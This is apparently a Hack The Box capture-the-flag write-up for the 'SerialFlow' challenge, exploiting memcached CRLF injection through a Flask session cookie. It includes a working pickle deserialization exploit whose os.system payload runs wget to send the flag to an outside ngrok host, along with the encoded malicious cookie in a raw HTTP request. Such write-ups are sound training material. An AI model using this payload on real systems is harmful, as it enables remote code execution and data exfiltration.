## Title 

SerialFlow

## Description

SerialFlow is the main global network used by KORP, you have managed to reach a root server web interface by traversing KORP's external proxy network. Can you break into the root server and open pandoras box by revealing the truth behind KORP?

## Solution

This challenge as less code but its more difficult to understand.
Essentially we have a python application that uses memcache to store the sessions.
It has two endpoints:
    - `/` that shows some javascript animations
    - `/set?uicolor=` That receives a parameter called uicolor that is saved in the session and is used in the first endpoint to change the color of the animations.
The first endpoint uses render_template and there is no filters in the uicolor parameter.
The problem is that it only uses the `uicolor` variable in javascript and css, not directly in the html.
I have found a vulnerability called `Memcached Poisoning`, https://github.com/CarlosG13/CVE-2021-33026 and https://nvd.nist.gov/vuln/detail/CVE-2021-33026, that needs to have access to the memcached service. However the service is not exposed in this challenge. I have tried to use the poc but failed:

`python3 cve-2021-33026_PoC.py --cookie session:94bdf0de-30ed-4b8b-adbf-c6fba2794280 --rhost 127.0.0.1 --rport 1337 --cmd ls`

If we find a way to communicate with the memcached server using another exploit we might be successful using this exploit.

After digging a bit on the internet i found an article talking about memcached injections and flask-session: [https://btlfry.gitlab.io/notes/posts/memcached-command-injections-at-pylibmc/]().
The article explains that there is a vulnerability in the flask-session when using memcached with a Cariage Return technique. They have used a cookie called nosecret but we will use the cookie session because thats the one which is used to store the sessions on memcached. In order to exploit this challenge we first used **ngrok**(`ngrok http --domain=mutually-cheerful-meerkat.ngrok-free.app 8000`) to receive a request to make sure it is vulnerable(`wget https://mutually-cheerful-meerkat.ngrok-free.app/`), then we can try to retrieve the flag(`wget https://mutually-cheerful-meerkat.ngrok-free.app/$(cat /flag*)`).
Note: We needed to open a python http server in order to receive the entire flag `python3 -m http.server`.

The exploit is bellow:

```python exploit.py
import pickle
import os

class RCE:
    def __reduce__(self):
        cmd = ('wget https://mutually-cheerful-meerkat.ngrok-free.app/$(cat /flag*)')
        return os.system, (cmd,)

def generate_exploit():
    payload = pickle.dumps(RCE(), 0)
    payload_size = len(payload)
    cookie = b'137\r\nset BT_:1337 0 2592000 '
    cookie += str.encode(str(payload_size))
    cookie += str.encode('\r\n')
    cookie += payload
    cookie += str.encode('\r\n')
    cookie += str.encode('get BT_:1337')

    pack = ''
    for x in list(cookie):
        if x > 64:
            pack += oct(x).replace("0o","\\")
        elif x < 8:
            pack += oct(x).replace("0o","\\00")
        else:
            pack += oct(x).replace("0o","\\0")

    return f"\"{pack}\""

print(generate_exploit())
```

After generate the exploit(`python3 exploit.py`) just put it in the burp request and used the endpoint to set the color of ui:

```shell
GET /set?uicolor=green HTTP/1.1
Host: 83.136.250.225:43293
User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:102.0) Gecko/20100101 Firefox/102.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
DNT: 1
Connection: close
Cookie: session="\061\063\067\015\012\163\145\164\040\102\124\137\072\061\063\063\067\040\060\040\062\065\071\062\060\060\060\040\071\071\015\012\143\160\157\163\151\170\012\163\171\163\164\145\155\012\160\060\012\050\126\167\147\145\164\040\150\164\164\160\163\072\057\057\155\165\164\165\141\154\154\171\055\143\150\145\145\162\146\165\154\055\155\145\145\162\153\141\164\056\156\147\162\157\153\055\146\162\145\145\056\141\160\160\057\044\050\143\141\164\040\057\146\154\141\147\052\051\012\160\061\012\164\160\062\012\122\160\063\012\056\015\012\147\145\164\040\102\124\137\072\061\063\063\067";
Upgrade-Insecure-Requests: 1

```


Flag: `HTB{y0u_th0ught_th15_wou1d_b3_s1mpl3?}`